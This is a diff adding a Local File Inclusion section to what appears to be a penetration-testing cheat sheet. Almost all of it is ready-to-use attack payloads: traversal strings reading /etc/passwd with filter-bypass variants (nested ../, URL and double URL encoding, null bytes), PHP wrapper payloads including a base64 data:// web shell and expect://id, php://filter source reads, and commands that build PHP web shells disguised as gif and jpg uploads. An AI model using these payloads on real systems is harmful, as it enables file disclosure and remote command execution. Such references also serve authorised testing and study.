@@ -509,6 +509,68 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 
 ## Local File Inclusion - LFI
 
+### Types
+
+#### Common
+
+../../../../etc/passwd
+
+#### Replace ../
+
+$language = str_replace('../', '', $_GET['file']);
+
+/....//....//....//....//etc/passwd
+..././..././..././..././etc/paswd
+....\/....\/....\/....\/etc/passwd
+
+#### Block . and /
+
+-> urlencode and Double urlencode
+
+/etc/passwd
+
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+
+#### Filter PHP
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+expect://id
+
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+
+#### PHP Wrappers
+
+-> Predefined Paths
+
+preg_match('/^\.\/okay\/.+$/', $_GET['file'])
+
+./okay/../../../../etc/passwd
+
+#### Bypass Extension PHP - Null Bytes
+
+/etc/passwd%00.php
+
+#### LFI + File Upload
+
+-> gif
+
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
+
+/codes/lfi/ok.gif
+
+-> Zip
+
+1- echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
+
+2- 
+
+/codes/lfi/ok.jpg
+
+#### Log Poisoning
+
 ### LFI - files for fuzzing
 
 ### Wordlist LFI - Linux
